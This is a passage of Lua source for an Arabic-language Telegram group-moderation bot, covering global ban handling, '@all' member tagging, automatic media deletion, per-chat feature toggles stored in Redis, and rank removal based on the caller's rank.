bot.setChatMemberStatus(msg.chat_id,UserId_Info.id,'restricted',{1,1,1,1,1,1,1,1,1})
end
if text == "الغاء حظر عام" and tonumber(msg.reply_to_message_id) ~= 0 then
local Remsg = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = bot.getUser(Remsg.sender.user_id)
if UserInfo.message == "Invalid user ID" then
bot.sendText(msg.chat_id,msg.id,"\n*‹ : عذرآ تستطيع فقط استخدام الامر على المستخدمين .*","md",true)  
return false
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
bot.sendText(msg.chat_id,msg.id,"\n*‹ : عذرآ لا تستطيع استخدام الامر على البوت .*","md",true)  
return false
end
t = "*‹ : تم الغاء حظر العام بنجاح .*"
redis:srem(bot_id..":bot:Ban",Remsg.sender.user_id)
bot.sendText(msg.chat_id,msg.id,Reply_Status(Remsg.sender.user_id,t).i,"md",true)    
bot.setChatMemberStatus(msg.chat_id,Remsg.sender.user_id,'restricted',{1,1,1,1,1,1,1,1,1})
end
if text == 'المحظورين عام' or text == 'قائمه العام' then
t = '\n*‹ : قائمه '..text..'  \nٴ━═━═━═━═━═━═━═━ *\n'
local Info_ = redis:smembers(bot_id..":bot:Ban") 
if #Info_ == 0 then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : لا يوجد "..text:gsub('ال',"").." .*").yu,"md",true)  
return false
end  
for k, v in pairs(Info_) do
local UserInfo = bot.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
t = t.." .*"..k.." ‹ : *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
t = t.." .*"..k.." ‹ :* ["..v.."](tg://user?id="..v..")\n"
end
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,t).yu,"md",true)  
end
if text == 'مسح المحظورين عام' or text == 'مسح قائمه العام' and Owner(msg) then
local Info_ = redis:smembers(bot_id..":bot:Ban") 
if #Info_ == 0 then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : تم حذف "..text:gsub('مسح',"").." سابقا .*").yu,"md",true)  
return false
end  
for k, v in pairs(Info_) do
bot.setChatMemberStatus(msg.chat_id,v,'restricted',{1,1,1,1,1,1,1,1,1})
end
redis:del(bot_id..":bot:Ban") 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." بنجاح .*").yu,"md",true)  
end
end
----------------------------------------------------------------------------------------------------
if not redis:get(bot_id..":"..msg.chat_id..":settings:all") then
if text == '@all' and BasicConstructor(msg) then
if redis:get(bot_id..':'..msg.chat_id..':all') then
return bot.sendText(msg.chat_id,msg.id,"*‹ : تم عمل تاك في المجموعه قبل قليل انتظر من فضلك .*","md",true) 
end
redis:setex(bot_id..':'..msg.chat_id..':all',300,true)
x = 0
tags = 0
local Info = bot.searchChatMembers(msg.chat_id, " .*", 200)
local members = Info.members
if #members <= 9 then
return bot.sendText(msg.chat_id,msg.id,"*‹ : لا يوجد عدد كافي من الاعضاء .*","md",true) 
end
for k, v in pairs(members) do
local UserInfo = bot.getUser(v.member_id.user_id)
if x == 10 or x == tags or k == 0 then
tags = x + 10
t = "#all"
end
x = x + 1
tagname = UserInfo.first_name.."ْ"
tagname = tagname:gsub('"',"")
tagname = tagname:gsub('"',"")
tagname = tagname:gsub("`","")
tagname = tagname:gsub(" .*","") 
tagname = tagname:gsub("_","")
tagname = tagname:gsub("]","")
tagname = tagname:gsub("[[]","")
t = t.." ~ ["..tagname.."](tg://user?id="..v.member_id.user_id..")"
if x == 10 or x == tags or k == 0 then
local Text = t:gsub('#all,','#all\n')
bot.sendText(msg.chat_id,0,Text,"md",true)  
end
end
end
if text and text:match("^@all (.*)$") and BasicConstructor(msg) then
if text:match("^@all (.*)$") ~= nil and text:match("^@all (.*)$") ~= "" then
TextMsg = text:match("^@all (.*)$")
if redis:get(bot_id..':'..msg.chat_id..':all') then
return bot.sendText(msg.chat_id,msg.id,"*‹ : تم عمل تاك في المجموعه قبل قليل انتظر من فضلك .*","md",true) 
end
redis:setex(bot_id..':'..msg.chat_id..':all',300,true)
x = 0
tags = 0
local Info = bot.searchChatMembers(msg.chat_id, " .*", 200)
local members = Info.members
if #members <= 9 then
return bot.sendText(msg.chat_id,msg.id,"*‹ : لا يوجد عدد كافي من الاعضاء .*","md",true) 
end
for k, v in pairs(members) do
local UserInfo = bot.getUser(v.member_id.user_id)
if x == 10 or x == tags or k == 0 then
tags = x + 10
t = "#all"
end
x = x + 1
tagname = UserInfo.first_name.."ْ"
tagname = tagname:gsub('"',"")
tagname = tagname:gsub('"',"")
tagname = tagname:gsub("`","")
tagname = tagname:gsub(" .*","") 
tagname = tagname:gsub("_","")
tagname = tagname:gsub("]","")
tagname = tagname:gsub("[[]","")
t = t.." ~ ["..tagname.."](tg://user?id="..v.member_id.user_id..")"
if x == 10 or x == tags or k == 0 then
local Text = t:gsub('#all,','#all\n')
TextMsg = TextMsg
TextMsg = TextMsg:gsub('"',"")
TextMsg = TextMsg:gsub('"',"")
TextMsg = TextMsg:gsub("`","")
TextMsg = TextMsg:gsub(" .*","") 
TextMsg = TextMsg:gsub("_","")
TextMsg = TextMsg:gsub("]","")
TextMsg = TextMsg:gsub("[[]","")
bot.sendText(msg.chat_id,0,TextMsg.."\nٴ━═━═━═━═━═━═━═━ \n"..Text,"md",true)  
end
end
end
end
end
--
if msg and msg.content then
if text == 'تنزيل جميع الرتب' and Creator(msg) then   
redis:del(bot_id..":"..msg.chat_id..":Status:BasicConstructor")
redis:del(bot_id..":"..msg.chat_id..":Status:Constructor")
redis:del(bot_id..":"..msg.chat_id..":Status:Owner")
redis:del(bot_id..":"..msg.chat_id..":Status:Administrator")
redis:del(bot_id..":"..msg.chat_id..":Status:Vips")
bot.sendText(msg.chat_id,msg.id,"*‹ : تم "..text.." بنجاح .*","md", true)
end
if msg.content.luatele == "messageSticker" or msg.content.luatele == "messageUnsupported" or msg.content.luatele == "messageContact" or msg.content.luatele == "messageVideoNote" or msg.content.luatele == "messageDocument" or msg.content.luatele == "messageVideo" or msg.content.luatele == "messageAnimation" or msg.content.luatele == "messagePhoto" then
redis:sadd(bot_id..":"..msg.chat_id..":mediaAude:ids",msg.id)  
end
if redis:get(bot_id..":"..msg.chat_id..":settings:mediaAude") then
local gmedia = redis:scard(bot_id..":"..msg.chat_id..":mediaAude:ids")  
if gmedia >= tonumber(redis:get(bot_id..":mediaAude:utdl"..msg.chat_id) or 200) then
local liste = redis:smembers(bot_id..":"..msg.chat_id..":mediaAude:ids")
for k,v in pairs(liste) do
local Mesge = v
if Mesge then
t = "*‹ : تم مسح "..k.." من الوسائط تلقائيا\n‹ : يمكنك تعطيل الميزه بستخدام الامر ( تعطيل المسح التلقائي ) .*"
bot.deleteMessages(msg.chat_id,{[1]= Mesge})
end
end
bot.sendText(msg.chat_id,msg.id,t,"md",true)
redis:del(bot_id..":"..msg.chat_id..":mediaAude:ids")
end
end
end
if text == 'تفعيل المسح التلقائي' and BasicConstructor(msg) then   
if redis:get(bot_id..":"..msg.chat_id..":settings:mediaAude") then
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." سابقا .*").yu
else
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." بنجاح .*").by
redis:set(bot_id..":"..msg.chat_id..":settings:mediaAude",true)  
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
if text == 'تعطيل المسح التلقائي' and BasicConstructor(msg) then  
if not redis:get(bot_id..":"..msg.chat_id..":settings:mediaAude") then
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." سابقا .*").yu
else
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." بنجاح .*").by
redis:del(bot_id..":"..msg.chat_id..":settings:mediaAude")  
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
if text == 'تفعيل all' and Creator(msg) then   
if redis:get(bot_id..":"..msg.chat_id..":settings:all") then
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." بنجاح .*").by
redis:del(bot_id..":"..msg.chat_id..":settings:all")  
else
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." سابقا .*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
if text == 'تعطيل all' and Creator(msg) then  
if not redis:get(bot_id..":"..msg.chat_id..":settings:all") then
redis:set(bot_id..":"..msg.chat_id..":settings:all",true)  
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." بنجاح .*").by
else
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." سابقا .*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
--
if BasicConstructor(msg) then
if text == 'تفعيل الرفع' then   
if redis:get(bot_id..":"..msg.chat_id..":settings:up") then
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." بنجاح .*").by
redis:del(bot_id..":"..msg.chat_id..":settings:up")  
else
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." سابقا .*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
if text == 'تعطيل الرفع' then  
if not redis:get(bot_id..":"..msg.chat_id..":settings:up") then
redis:set(bot_id..":"..msg.chat_id..":settings:up",true)  
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." بنجاح .*").by
else
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." سابقا .*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
if text == 'تفعيل الكتم' then   
if redis:get(bot_id..":"..msg.chat_id..":settings:ktm") then
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." بنجاح .*").by
redis:del(bot_id..":"..msg.chat_id..":settings:ktm")  
else
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." سابقا .*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
if text == 'تعطيل الكتم' then  
if not redis:get(bot_id..":"..msg.chat_id..":settings:ktm") then
redis:set(bot_id..":"..msg.chat_id..":settings:ktm",true)  
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." بنجاح .*").by
else
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." سابقا .*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
if text == 'تفعيل الحظر' then   
if redis:get(bot_id..":"..msg.chat_id..":settings:bn") then
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." بنجاح .*").by
redis:del(bot_id..":"..msg.chat_id..":settings:bn")  
else
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." سابقا .*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
if text == 'تعطيل الحظر' then  
if not redis:get(bot_id..":"..msg.chat_id..":settings:bn") then
redis:set(bot_id..":"..msg.chat_id..":settings:bn",true)  
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." بنجاح .*").by
else
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." سابقا .*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
if text == 'تفعيل الطرد' then   
if redis:get(bot_id..":"..msg.chat_id..":settings:kik") then
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." بنجاح .*").by
redis:del(bot_id..":"..msg.chat_id..":settings:kik")  
else
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." سابقا .*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
if text == 'تعطيل الطرد' then  
if not redis:get(bot_id..":"..msg.chat_id..":settings:kik") then
redis:set(bot_id..":"..msg.chat_id..":settings:kik",true)  
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." بنجاح .*").by
else
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." سابقا .*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
end
--
if Owner(msg) then
if text and text:match("^وضع عدد المسح (.*)$") then
local Teext = text:match("^وضع عدد المسح (.*)$") 
if Teext and Teext:match('%d+') then
t = "*‹ : تم تعيين  ( "..Teext.." ) كعدد للحذف التلقائي .*"
redis:set(bot_id..":mediaAude:utdl"..msg.chat_id,Teext)
else
t = "‹ : عذرا يجب كتابه ( وضع عدد المسح + رقم )"
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,t).yu,"md",true)
end
if text == ("عدد الميديا") or text == ("الميديا") then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : عدد الميديا هو :  "..redis:scard(bot_id..":"..msg.chat_id..":mediaAude:ids").." .*").yu,"md",true)
end
--
if text == 'تفعيل اطردني' then   
if redis:get(bot_id..":"..msg.chat_id..":settings:kickme") then
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." بنجاح .*").by
redis:del(bot_id..":"..msg.chat_id..":settings:kickme")  
else
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." سابقا .*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
if text == 'تعطيل اطردني' then  
if not redis:get(bot_id..":"..msg.chat_id..":settings:kickme") then
redis:set(bot_id..":"..msg.chat_id..":settings:kickme",true)  
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." بنجاح .*").by
else
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." سابقا .*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
--
if text == 'تفعيل المميزات' then 
if redis:get(bot_id..":"..msg.chat_id..":Features") then
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." بنجاح .*").by
redis:del(bot_id..":"..msg.chat_id..":Features")  
else
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." سابقا .*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
if text == 'تعطيل المميزات' then  
if not redis:get(bot_id..":"..msg.chat_id..":Features") then
redis:set(bot_id..":"..msg.chat_id..":Features",true)  
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." بنجاح .*").by
else
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." سابقا .*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
if text == 'تفعيل ردود البوت' and Creator(msg) then         
if redis:get(bot_id..":"..msg.chat_id..":Rdodbot") then
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." بنجاح .*").by
redis:del(bot_id..":"..msg.chat_id..":Rdodbot")  
else
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." سابقا .*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
--
if text == 'تعطيل ردود البوت' and Creator(msg) then        
if not redis:get(bot_id..":"..msg.chat_id..":Rdodbot") then
redis:set(bot_id..":"..msg.chat_id..":Rdodbot",true)  
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." بنجاح .*").by
else
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." سابقا .*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
--
if text == 'تفعيل امسح' and Creator(msg) then      
if redis:get(bot_id..":"..msg.chat_id..":Amsh") then
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." بنجاح .*").by
redis:del(bot_id..":"..msg.chat_id..":Amsh")  
else
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." سابقا .*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
if text == 'تعطيل امسح' and Creator(msg) then     
if not redis:get(bot_id..":"..msg.chat_id..":Amsh") then
redis:set(bot_id..":"..msg.chat_id..":Amsh",true)  
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." بنجاح .*").by
else
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." سابقا .*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
--
if text == 'تفعيل الالعاب' then   
if redis:get(bot_id..":"..msg.chat_id..":settings:game") then
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." بنجاح .*").by
redis:del(bot_id..":"..msg.chat_id..":settings:game")  
else
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." سابقا .*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
if text == 'تعطيل الالعاب' then  
if not redis:get(bot_id..":"..msg.chat_id..":settings:game") then
redis:set(bot_id..":"..msg.chat_id..":settings:game",true)  
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." بنجاح .*").by
else
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." سابقا .*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
--
if text == 'تفعيل صورتي' then   
if redis:get(bot_id..":"..msg.chat_id..":settings:phme") then
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." بنجاح .*").by
redis:del(bot_id..":"..msg.chat_id..":settings:phme")  
else
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." سابقا .*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
if text == 'تعطيل صورتي' then  
if not redis:get(bot_id..":"..msg.chat_id..":settings:phme") then
redis:set(bot_id..":"..msg.chat_id..":settings:phme",true)  
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." بنجاح .*").by
else
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." سابقا .*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
--
if text == 'تفعيل البايو' then   
if redis:get(bot_id..":"..msg.chat_id..":settings:GetBio") then
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." بنجاح .*").by
redis:del(bot_id..":"..msg.chat_id..":settings:GetBio")  
else
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." سابقا .*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
if text == 'تعطيل البايو' then  
if not redis:get(bot_id..":"..msg.chat_id..":settings:GetBio") then
redis:set(bot_id..":"..msg.chat_id..":settings:GetBio",true)  
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." بنجاح .*").by
else
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." سابقا .*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
--
if text == 'تفعيل الرابط' then   
if redis:get(bot_id..":"..msg.chat_id..":settings:link") then
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." بنجاح .*").by
redis:del(bot_id..":"..msg.chat_id..":settings:link")  
else
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." سابقا .*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
if text == 'تعطيل الرابط' then  
if not redis:get(bot_id..":"..msg.chat_id..":settings:link") then
redis:set(bot_id..":"..msg.chat_id..":settings:link",true)  
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." بنجاح .*").by
else
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." سابقا .*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
--
if text == 'تفعيل الترحيب' then   
if redis:get(bot_id..":"..msg.chat_id..":settings:Welcome") then
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." بنجاح .*").by
redis:del(bot_id..":"..msg.chat_id..":settings:Welcome")  
else
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." سابقا .*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
if text == 'تعطيل الترحيب' then  
if not redis:get(bot_id..":"..msg.chat_id..":settings:Welcome") then
redis:set(bot_id..":"..msg.chat_id..":settings:Welcome",true)  
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." بنجاح .*").by
else
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." سابقا .*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
--
if text == 'تفعيل التنظيف' then   
if redis:get(bot_id..":"..msg.chat_id..":settings:delmsg") then
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." بنجاح .*").by
redis:del(bot_id..":"..msg.chat_id..":settings:delmsg")  
else
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." سابقا .*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
if text == 'تعطيل التنظيف' then  
if not redis:get(bot_id..":"..msg.chat_id..":settings:delmsg") then
redis:set(bot_id..":"..msg.chat_id..":settings:delmsg",true)  
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." بنجاح .*").by
else
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." سابقا .*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
--
if text == 'تفعيل الايدي' then   
if redis:get(bot_id..":"..msg.chat_id..":settings:id") then
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." بنجاح .*").by
redis:del(bot_id..":"..msg.chat_id..":settings:id")  
else
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." سابقا .*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
if text == 'تعطيل الايدي' then  
if not redis:get(bot_id..":"..msg.chat_id..":settings:id") then
redis:set(bot_id..":"..msg.chat_id..":settings:id",true)  
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." بنجاح .*").by
else
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." سابقا .*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
--
if text == 'تفعيل الايدي بالصوره' then   
if redis:get(bot_id..":"..msg.chat_id..":settings:id:ph") then
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." بنجاح .*").by
redis:del(bot_id..":"..msg.chat_id..":settings:id:ph")  
else
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." سابقا .*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
if text == 'تعطيل الايدي بالصوره' then  
if not redis:get(bot_id..":"..msg.chat_id..":settings:id:ph") then
redis:set(bot_id..":"..msg.chat_id..":settings:id:ph",true)  
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." بنجاح .*").by
else
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." سابقا .*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
--
if text == 'تفعيل الردود' or text == 'تفعيل ردود المدير' then
if redis:get(bot_id..":"..msg.chat_id..":settings:Reply") then
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." بنجاح .*").by
redis:del(bot_id..":"..msg.chat_id..":settings:Reply")  
else
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." سابقا .*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
if text == 'تعطيل الردود' or text == 'تعطيل ردود المدير' then
if not redis:get(bot_id..":"..msg.chat_id..":settings:Reply") then
redis:set(bot_id..":"..msg.chat_id..":settings:Reply",true)  
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." بنجاح .*").by
else
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." سابقا .*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
--
if text == 'تفعيل الردود العامه' then   
if redis:get(bot_id..":"..msg.chat_id..":settings:Reply:all") then
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." بنجاح*").by
redis:del(bot_id..":"..msg.chat_id..":settings:Reply:all")  
else
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." سابقا*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
if text == 'تعطيل الردود العامه' then  
if not redis:get(bot_id..":"..msg.chat_id..":settings:Reply:all") then
redis:set(bot_id..":"..msg.chat_id..":settings:Reply:all",true)  
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." بنجاح*").by
else
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." سابقا*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
--
if text == 'تفعيل منو ضافني' then   
if redis:get(bot_id..":"..msg.chat_id..":settings:addme") then
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." بنجاح .*").by
redis:del(bot_id..":"..msg.chat_id..":settings:addme")  
else
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." سابقا .*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
if text == 'تعطيل منو ضافني' then  
if not redis:get(bot_id..":"..msg.chat_id..":settings:addme") then
redis:set(bot_id..":"..msg.chat_id..":settings:addme",true)  
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." بنجاح .*").by
else
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." سابقا .*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
--
if text == 'تفعيل الالعاب الاحترافيه' then   
if redis:get(bot_id..":"..msg.chat_id..":settings:gameVip") then
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." بنجاح .*").by
redis:del(bot_id..":"..msg.chat_id..":settings:gameVip")  
else
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." سابقا .*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
if text == 'تعطيل الالعاب الاحترافيه' then  
if not redis:get(bot_id..":"..msg.chat_id..":settings:gameVip") then
redis:set(bot_id..":"..msg.chat_id..":settings:gameVip",true)  
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." بنجاح .*").by
else
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." سابقا .*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
--
if text == 'تفعيل اوامر التسليه' then   
if redis:get(bot_id..":"..msg.chat_id..":settings:entertainment") then
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." بنجاح .*").by
redis:del(bot_id..":"..msg.chat_id..":settings:entertainment")  
else
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." سابقا .*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
if text == 'تعطيل اوامر التسليه' then  
if not redis:get(bot_id..":"..msg.chat_id..":settings:entertainment") then
redis:set(bot_id..":"..msg.chat_id..":settings:entertainment",true)  
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." بنجاح .*").by
else
Text = Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." سابقا .*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
----------------------------------------------------------------------------------------------------
end
----------------------------------------------------------------------------------------------------
if text and text:match('^تنزيل الكل (%d+)$') and tonumber(msg.reply_to_message_id) == 0 then
local UserName = text:match('^تنزيل الكل (%d+)$')
local UserInfo = bot.getUser(UserName)
if UserInfo.code == 400 or UserInfo.message == "Invalid user ID" then
return false
end
if Get_Rank(UserName,msg.chat_id)== "العضو" then
tt = "لا يمتلك رتبه بالفعل"
else
tt = "تم تنزيله من جميع الرتب بنجاح"
end
if devB(msg.sender.user_id) then
redis:srem(bot_id..":Status:programmer",UserName)
redis:srem(bot_id..":Status:developer",UserName)
redis:srem(bot_id..":"..msg.chat_id..":Status:BasicConstructor",UserName)
redis:srem(bot_id..":"..msg.chat_id..":Status:Constructor",UserName)
redis:srem(bot_id..":"..msg.chat_id..":Status:Owner",UserName)
redis:srem(bot_id..":"..msg.chat_id..":Status:Administrator",UserName)
redis:srem(bot_id..":"..msg.chat_id..":Status:Vips",UserName)
elseif programmer(msg) then
redis:srem(bot_id..":Status:developer",UserName)
redis:srem(bot_id..":"..msg.chat_id..":Status:BasicConstructor",UserName)
redis:srem(bot_id..":"..msg.chat_id..":Status:Constructor",UserName)
redis:srem(bot_id..":"..msg.chat_id..":Status:Owner",UserName)
redis:srem(bot_id..":"..msg.chat_id..":Status:Administrator",UserName)
redis:srem(bot_id..":"..msg.chat_id..":Status:Vips",UserName)
elseif developer(msg) then
redis:srem(bot_id..":"..msg.chat_id..":Status:Creator",UserName)
redis:srem(bot_id..":"..msg.chat_id..":Status:BasicConstructor",UserName)
redis:srem(bot_id..":"..msg.chat_id..":Status:Constructor",UserName)
redis:srem(bot_id..":"..msg.chat_id..":Status:Owner",UserName)
redis:srem(bot_id..":"..msg.chat_id..":Status:Administrator",UserName)
redis:srem(bot_id..":"..msg.chat_id..":Status:Vips",UserName)
elseif Creator(msg) then
redis:srem(bot_id..":"..msg.chat_id..":Status:BasicConstructor",UserName)
redis:srem(bot_id..":"..msg.chat_id..":Status:Constructor",UserName)
redis:srem(bot_id..":"..msg.chat_id..":Status:Owner",UserName)
redis:srem(bot_id..":"..msg.chat_id..":Status:Administrator",UserName)
redis:srem(bot_id..":"..msg.chat_id..":Status:Vips",UserName)
elseif BasicConstructor(msg) then
redis:srem(bot_id..":"..msg.chat_id..":Status:Constructor",UserName)
redis:srem(bot_id..":"..msg.chat_id..":Status:Owner",UserName)
redis:srem(bot_id..":"..msg.chat_id..":Status:Administrator",UserName)
redis:srem(bot_id..":"..msg.chat_id..":Status:Vips",UserName)
elseif Constructor(msg) then
redis:srem(bot_id..":"..msg.chat_id..":Status:Owner",UserName)
redis:srem(bot_id..":"..msg.chat_id..":Status:Administrator",UserName)
redis:srem(bot_id..":"..msg.chat_id..":Status:Vips",UserName)
elseif Owner(msg) then
redis:srem(bot_id..":"..msg.chat_id..":Status:Administrator",UserName)
redis:srem(bot_id..":"..msg.chat_id..":Status:Vips",UserName)
elseif Administrator(msg) then
redis:srem(bot_id..":"..msg.chat_id..":Status:Vips",UserName)
elseif Vips(msg) then
return false
else
return false
end
